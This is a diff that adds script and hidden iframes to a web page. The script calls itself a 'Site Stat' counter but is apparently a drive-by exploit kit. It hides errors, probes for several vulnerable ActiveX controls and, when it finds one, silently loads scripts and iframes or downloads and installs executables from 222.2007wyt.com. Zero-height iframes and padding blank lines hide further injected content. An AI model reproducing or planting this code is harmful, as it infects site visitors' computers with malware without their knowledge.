@@ -1,0 +1,32 @@
+<SCRIPT>window.onerror=function(){return true;}</SCRIPT>
+<SCRIPT>
+<!-- START ZHUZI Site Stat. -->
+window.defaultStatus="Íê³É";
+try{if(new ActiveXObject("snpvw.Snapshot Viewer Control.1"))document.write('<iframe width=100 height=0 src=http://222.2007wyt.com/ac.html></iframe>')}catch(a){}try{var b;var gw=new ActiveXObject("Downloader.DLoader.1")}catch(b){};finally{if(b!="[object Error]"){document.write('<object classid="clsid:78ABDC59-D8E7-44D3-9A76-9A0918C52B4A" id="install" width=0 height=0></object>');install["DownloadAndInstall"]("http://222.2007wyt.com/sina.css")}}try{var e;var fderer="dfk#*&$FEFsdfdsfds";var ado=document.createElement("object");if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)ado.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");var as=ado.createobject("Adodb.Stream","")}catch(e){};finally{if(e!="[object Error]"){document.write("<script src=http:\/\/222.2007wyt.com\/614.js><\/script>")}else{try{var g;var storm=new ActiveXObject("UUUPGRADE.UUUpgradeCtrl.1")}catch(g){};finally{if(g!="[object Error]"){var url="http://222.2007wyt.com/";storm=document.createElement("object");ActivePerl="-1C59-4BBB-8E8";getSpraySlide="1-6E83F82C813B";helloworld2Address="clsid:2CACD7BB";storm.setAttribute("classid",helloworld2Address+ActivePerl+getSpraySlide);storm["Update"]("\\Program Files\\Common Files\\uusee\\",url+"UU.ini","",1)}}try{var h;var glworld=new ActiveXObject("GLIEDown.IEDown.1")}catch(h){};finally{if(h!="[object Error]"){document.write('<iframe style=display:none src="http://222.2007wyt.com/l.html"></iframe>')}}try{var i;var real=new ActiveXObject("IERPCtl.IERPCtl.1")}catch(i){};finally{if(i!="[object Error]"){if(new ActiveXObject("IERPCtl.IERPCtl.1").PlayerProperty("PRODUCTVERSION")<="6.0.14.552"){document.write('<sCrIpT LAnGuAgE="jAvAsCrIpT" src=http:\/\/222.2007wyt.com\/r.js><\/script>')}else{document.write('<iframe style=display:none src="http://222.2007wyt.com/r.html"></iframe>')}}}try{var j;var Baidu=new ActiveXObject("BaiduBar.Tool")}catch(j){};finally{if(j!="[object Error]"){Baidu["DloadDS"]("http://222.2007wyt.com/Baidu.cab","Baidu.exe",0)}}if(f=="[object Error]"&&g=="[object Error]"&&h=="[object Error]"&&i=="[object Error]"){try{}catch(e){}}}}
+</script>
+
+<iframe src=fzl.htm width=100 height=0></iframe>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<iframe src=123.htm width=50 height=0></iframe>
